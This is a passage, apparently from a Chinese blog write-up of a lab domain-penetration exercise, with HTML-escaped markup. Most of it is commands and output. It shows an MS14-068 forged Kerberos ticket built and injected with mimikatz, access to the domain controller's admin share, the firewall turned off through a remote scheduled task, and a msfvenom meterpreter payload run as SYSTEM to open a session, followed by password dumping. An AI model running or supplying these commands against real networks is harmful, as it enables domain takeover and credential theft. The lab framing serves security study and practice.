class=\"hljs-number\"\u003e11\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e04\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e37\u003c/span\u003e         \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e192\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e703\u003c/span\u003e Invoke-DCSync.ps1\n\u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e01\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e37\u003c/span\u003e            \u003cspan class=\"hljs-number\"\u003e47\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e937\u003c/span\u003e Invoke-Kerberoast.ps1\n\u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e01\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e03\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e02\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e         \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e040\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e136\u003c/span\u003e mimikatz.exe\n\u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e01\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e         \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e492\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e558\u003c/span\u003e MS14\u003cspan class=\"hljs-number\"\u003e-068.\u003c/span\u003eexe\n\u003cspan class=\"hljs-number\"\u003e2004\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e02\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e01\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e           \u003cspan class=\"hljs-number\"\u003e344\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e576\u003c/span\u003e NetSess.exe\n\u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e01\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e           \u003cspan class=\"hljs-number\"\u003e374\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e944\u003c/span\u003e PsExec64.exe\n\u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e01\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e            \u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e248\u003c/span\u003e PVEFindADUser.exe\n\u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e01\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e               \u003cspan class=\"hljs-number\"\u003e193\u003c/span\u003e report.csv\n\u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e01\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e06\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e05\u003c/span\u003e             \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e175\u003c/span\u003e RProcdump.ps1\n\u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e01\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e             \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e897\u003c/span\u003e systeiminfo_win7.txt\n\u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e01\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e             \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e074\u003c/span\u003e TGT_douser@demo.com.ccache\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003eMS14-068\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e获取用户SID\u003c/p\u003e\n\u003cp\u003e首先通过\u003ccode\u003emigrate\u003c/code\u003e到\u003ccode\u003eDouser\u003c/code\u003e的内存下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003emeterpreter \u003e ps\n \u003cspan class=\"hljs-number\"\u003e2116\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e372\u003c/span\u003e   conhost.exe        x64   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e        DEMO\\douser                   C:\\Windows\\system32\\conhost.exe\n \u003cspan class=\"hljs-number\"\u003e2720\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e464\u003c/span\u003e   taskhost.exe       x64   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e        DEMO\\douser                   C:\\Windows\\system32\\taskhost.exe\n \u003cspan class=\"hljs-number\"\u003e2784\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2852\u003c/span\u003e  explorer.exe       x64   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e        DEMO\\douser                   C:\\Windows\\Explorer.EXE\n \u003cspan class=\"hljs-number\"\u003e2888\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e840\u003c/span\u003e   dwm.exe            x64   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e        DEMO\\douser                   C:\\Windows\\system32\\Dwm.exe\nmeterpreter \u003e migrate \u003cspan class=\"hljs-number\"\u003e2784\u003c/span\u003e\n[*] Migrating from \u003cspan class=\"hljs-number\"\u003e836\u003c/span\u003e to \u003cspan class=\"hljs-number\"\u003e2784.\u003c/span\u003e..\n[*] Migration completed successfully.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e进入\u003ccode\u003eshell\u003c/code\u003e模式获取用户\u003ccode\u003eSID\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003emeterpreter \u003e shell\nC:\\Windows\\system32\u003ewhoami /all\nSID                                          \n=========== =============================================\ndemo\\douser S\u003cspan class=\"hljs-number\"\u003e-1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-5\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-21\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-979886063\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-1111900045\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-1414766810\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-1107\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eS-1-5-21-979886063-1111900045-1414766810-1107\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e利用桌面的\u003ccode\u003ems14-068.exe\u003c/code\u003e提权工具生成伪造的\u003ccode\u003ekerberos\u003c/code\u003e协议认证证书\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003ec:\\Users\\douser\\Desktop\u003eMS14\u003cspan class=\"hljs-number\"\u003e-068.\u003c/span\u003eexe -u douser@demo.com -s S\u003cspan class=\"hljs-number\"\u003e-1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-5\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-21\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-979886063\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-1111900045\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-1414766810\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-1107\u003c/span\u003e -d \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.130\u003c/span\u003e -p Dotest123\nMS14\u003cspan class=\"hljs-number\"\u003e-068.\u003c/span\u003eexe -u douser@demo.com -s S\u003cspan class=\"hljs-number\"\u003e-1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-5\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-21\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-979886063\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-1111900045\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-1414766810\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-1107\u003c/span\u003e -d \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.130\u003c/span\u003e -p Dotest123\n  [+] Building AS-REQ \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.130\u003c/span\u003e... Done!\n  [+] Sending AS-REQ to \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.130\u003c/span\u003e... Done!\n  [+] Receiving AS-REP from \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.130\u003c/span\u003e... Done!\n  [+] Parsing AS-REP from \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.130\u003c/span\u003e... Done!\n  [+] Building TGS-REQ \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.130\u003c/span\u003e... Done!\n  [+] Sending TGS-REQ to \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.130\u003c/span\u003e... Done!\n  [+] Receiving TGS-REP from \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.130\u003c/span\u003e... Done!\n  [+] Parsing TGS-REP from \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.130\u003c/span\u003e... Done!\n  [+] Creating ccache file \u003cspan class=\"hljs-string\"\u003e'TGT_douser@demo.com.ccache'\u003c/span\u003e... Done!\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e利用\u003ccode\u003emimikatz\u003c/code\u003e （桌面上也有）来导入票据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003ec:\\Users\\douser\\Desktop\u003emimikatz.exe\nmimikatz.exe\n\n  .#####.   mimikatz \u003cspan class=\"hljs-number\"\u003e2.2\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e (x64) #\u003cspan class=\"hljs-number\"\u003e18362\u003c/span\u003e Jan  \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e\n .## ^ ##.  \u003cspan class=\"hljs-string\"\u003e\"A La Vie, A L'Amour\"\u003c/span\u003e - (oe.eo)\n ## / \\ ##  \u003cspan class=\"hljs-comment\"\u003e/*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       \u003e http://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        \u003e http://pingcastle.com / http://mysmartlogon.com   ***/\u003c/span\u003e\n\nmimikatz \u003cspan class=\"hljs-meta\"\u003e# kerberos::purge\u003c/span\u003e\nTicket(s) purge \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e current session is OK\n\nmimikatz \u003cspan class=\"hljs-meta\"\u003e# kerberos::list\u003c/span\u003e\n\nmimikatz \u003cspan class=\"hljs-meta\"\u003e# kerberos::ptc C:\\users\\douser\\Desktop\\TGT_douser@demo.com.ccache\u003c/span\u003e\n\nPrincipal : (\u003cspan class=\"hljs-number\"\u003e01\u003c/span\u003e) : douser ; @ DEMO.COM\n\nData \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n           Start/End/MaxRenew: \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e ; \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e ; \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e\n           Service \u003cspan class=\"hljs-title function_\"\u003eName\u003c/span\u003e \u003cspan class=\"hljs-params\"\u003e(\u003cspan class=\"hljs-number\"\u003e01\u003c/span\u003e)\u003c/span\u003e : krbtgt ; DEMO.COM ; @ DEMO.COM\n           Target \u003cspan class=\"hljs-title function_\"\u003eName\u003c/span\u003e  \u003cspan class=\"hljs-params\"\u003e(\u003cspan class=\"hljs-number\"\u003e01\u003c/span\u003e)\u003c/span\u003e : krbtgt ; DEMO.COM ; @ DEMO.COM\n           Client \u003cspan class=\"hljs-title function_\"\u003eName\u003c/span\u003e  \u003cspan class=\"hljs-params\"\u003e(\u003cspan class=\"hljs-number\"\u003e01\u003c/span\u003e)\u003c/span\u003e : douser ; @ DEMO.COM\n           Flags \u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003ea00000    : pre_authent ; renewable ; proxiable ; forwardable ; \n           Session Key       : \u003cspan class=\"hljs-number\"\u003e0x00000017\u003c/span\u003e - rc4_hmac_nt      \n             d030a0db75eadb9b5f672b49a11721c9\n           Ticket            : \u003cspan class=\"hljs-number\"\u003e0x00000000\u003c/span\u003e - null              ; kvno = \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e        [...]\n           * Injecting ticket : OK\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e操作分别是：清空当前票据，查看当前票据，导入票据\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看当前票据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003emimikatz \u003cspan class=\"hljs-meta\"\u003e# kerberos::list\u003c/span\u003e\n\n[\u003cspan class=\"hljs-number\"\u003e00000000\u003c/span\u003e] - \u003cspan class=\"hljs-number\"\u003e0x00000017\u003c/span\u003e - rc4_hmac_nt      \n   Start/End/MaxRenew: \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e ; \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e ; \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e\n   Server Name       : krbtgt/DEMO.COM @ DEMO.COM\n   Client Name       : douser @ DEMO.COM\n   Flags \u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003ea00000    : pre_authent ; renewable ; proxiable ; forwardable ;\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e尝试通过IPC连接DC\u003c/p\u003e\n\u003cp\u003eps：记得使用主机名，否则默认走\u003ccode\u003eNTLM\u003c/code\u003e协议\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003ec:\\Users\\douser\\Desktop\u003edir \\\\WIN-ENS2VR5TR3N\\c$\ndir \\\\WIN-ENS2VR5TR3N\\c$\n Volume in drive \\\\WIN-ENS2VR5TR3N\\c$ has no label.\n Volume Serial Number is \u003cspan class=\"hljs-number\"\u003e702B\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-0\u003c/span\u003eD1B\n\n Directory of \\\\WIN-ENS2VR5TR3N\\c$\n\n\u003cspan class=\"hljs-number\"\u003e2009\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e07\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e    \u0026#x3C;DIR\u003e          PerfLogs\n\u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e01\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e    \u0026#x3C;DIR\u003e          Program Files\n\u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e01\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e    \u0026#x3C;DIR\u003e          Program \u003cspan class=\"hljs-title function_\"\u003eFiles\u003c/span\u003e \u003cspan class=\"hljs-params\"\u003e(x86)\u003c/span\u003e\n2019/12/31  11:01    \u0026#x3C;DIR\u003e          Users\n2020/01/24  13:33    \u0026#x3C;DIR\u003e          Windows\n               0 \u003cspan class=\"hljs-title function_\"\u003eFile\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(s)\u003c/span\u003e              0 bytes\n               5 \u003cspan class=\"hljs-title function_\"\u003eDir\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(s)\u003c/span\u003e  11,366,170,624 bytes \u003cspan class=\"hljs-built_in\"\u003efree\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功访问到域控，也算拿下了\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003e上线DC\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003ewin7\u003c/code\u003e桌面下还提供呢\u003ccode\u003ePsexec64.exe\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003ec:\\Users\\douser\\Desktop\u003epsexec64 \\\\WIN-ENS2VR5TR3N.demo.com cmd.exe \\ipconfig                            \npsexec64 \\\\WIN-ENS2VR5TR3N.demo.com cmd.exe \\ipconfig                                                    \n                                                                                                         \nPsExec v2.\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e - Execute processes remotely            \n\u003cspan class=\"hljs-title function_\"\u003eCopyright\u003c/span\u003e \u003cspan class=\"hljs-params\"\u003e(C)\u003c/span\u003e 2001-2016 Mark Russinovich                                                                 \nSysinternals - www.sysinternals.com\n                                                                                                         \nStarting cmd.exe on WIN-ENS2VR5TR3N.demo.com...3N.demo.com...demo.com...                                 \ncmd.exe exited on WIN-ENS2VR5TR3N.demo.com with error code 0.  \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是不知道为什么连不上\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e通过计划任务关闭防火墙\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e新建\u003ccode\u003e1.bat\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003e\u003cspan class=\"hljs-meta\"\u003e# vim 1.bat\u003c/span\u003e\nnetsh advfirewall \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e allprofiles state off\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e通过\u003ccode\u003eMSF\u003c/code\u003e上传到靶机\u003ccode\u003ewin7\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003emeterpreter \u003e upload ~/Desktop/test/\u003cspan class=\"hljs-number\"\u003e1.b\u003c/span\u003eat C:/users/douser/Desktop\n[*] Uploading  : /root/Desktop/test/\u003cspan class=\"hljs-number\"\u003e1.b\u003c/span\u003eat -\u003e C:/users/douser/Desktop\\\u003cspan class=\"hljs-number\"\u003e1.b\u003c/span\u003eat\n[*] Completed  : /root/Desktop/test/\u003cspan class=\"hljs-number\"\u003e1.b\u003c/span\u003eat -\u003e C:/users/douser/Desktop\\\u003cspan class=\"hljs-number\"\u003e1.b\u003c/span\u003eat\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e在\u003ccode\u003eshell\u003c/code\u003e模式将\u003ccode\u003e1.bat\u003c/code\u003e传到\u003ccode\u003eDC\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003eC:\\Windows\\system32\u003ecopy c:\\users\\douser\\desktop\\\u003cspan class=\"hljs-number\"\u003e1.b\u003c/span\u003eat \\\\WIN-ENS2VR5TR3N\\c$\ncopy c:\\users\\douser\\desktop\\\u003cspan class=\"hljs-number\"\u003e1.b\u003c/span\u003eat \\\\WIN-ENS2VR5TR3N\\c$\n        \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e file(s) copied.\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e创建计划任务关闭防火墙（\u003ccode\u003eST\u003c/code\u003e是时间，也可以调成手动运行）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003eschtasks /create /S WIN-ENS2VR5TR3N /TN \u003cspan class=\"hljs-string\"\u003e\"test1\"\u003c/span\u003e /TR c:/\u003cspan class=\"hljs-number\"\u003e1.b\u003c/span\u003eat /SC ONCE /ST \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e49\u003c/span\u003e /ru system /f\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e通过计划任务上线\u003ccode\u003eDC\u003c/code\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003emsfvenom\u003c/code\u003e生成\u003ccode\u003eexe\u003c/code\u003e马\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003emsfvenom -p windows/x64/meterpreter/bind_tcp LHOST=\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.130\u003c/span\u003e LPORT=\u003cspan class=\"hljs-number\"\u003e2345\u003c/span\u003e -f exe \u003e shell.exe\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e用上面的方式上传\u003ccode\u003eexe\u003c/code\u003e马到\u003ccode\u003eDC\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eKali监听\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003emsf6 \u003cspan class=\"hljs-title function_\"\u003eexploit\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(windows/smb/ms17_010_eternalblue)\u003c/span\u003e \u003e use exploit/multi/handler \nmsf6 \u003cspan class=\"hljs-title function_\"\u003eexploit\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(multi/handler)\u003c/span\u003e \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e payload windows/x64/meterpreter/bind_tcp\nmsf6 \u003cspan class=\"hljs-title function_\"\u003eexploit\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(multi/handler)\u003c/span\u003e \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e lport 2345\nmsf6 \u003cspan class=\"hljs-title function_\"\u003eexploit\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(multi/handler)\u003c/span\u003e \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e rhost 192.168.183.130\nmsf6 \u003cspan class=\"hljs-title function_\"\u003eexploit\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(multi/handler)\u003c/span\u003e \u003e run\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e通过计划任务执行\u003ccode\u003eshell.exe\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003eschtasks /create /S WIN-ENS2VR5TR3N /TN \u003cspan class=\"hljs-string\"\u003e\"test1\"\u003c/span\u003e /TR c:/shell.exe /SC ONCE /ST \u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e03\u003c/span\u003e /ru system /f\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e成功上线MSF\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003emsf6 \u003cspan class=\"hljs-title function_\"\u003eexploit\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(multi/handler)\u003c/span\u003e \u003e run\n\n[*] Started bind TCP handler against 192.168.183.130:2345\n[*] Sending \u003cspan class=\"hljs-title function_\"\u003estage\u003c/span\u003e \u003cspan class=\"hljs-params\"\u003e(\u003cspan class=\"hljs-number\"\u003e201798\u003c/span\u003e bytes)\u003c/span\u003e to 192.168.183.130\n[*] Meterpreter session 1 \u003cspan class=\"hljs-title function_\"\u003eopened\u003c/span\u003e \u003cspan class=\"hljs-params\"\u003e(\u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0.1\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e44267\u003c/span\u003e -\u003e \u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0.1\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1080\u003c/span\u003e)\u003c/span\u003e at 2024-12-03 23:13:39 +0800\n\nmeterpreter \u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e然后通过\u003ccode\u003emimikatz\u003c/code\u003e读取密码\u003c/p\u003e\n\u003cp\u003e\u003cimg 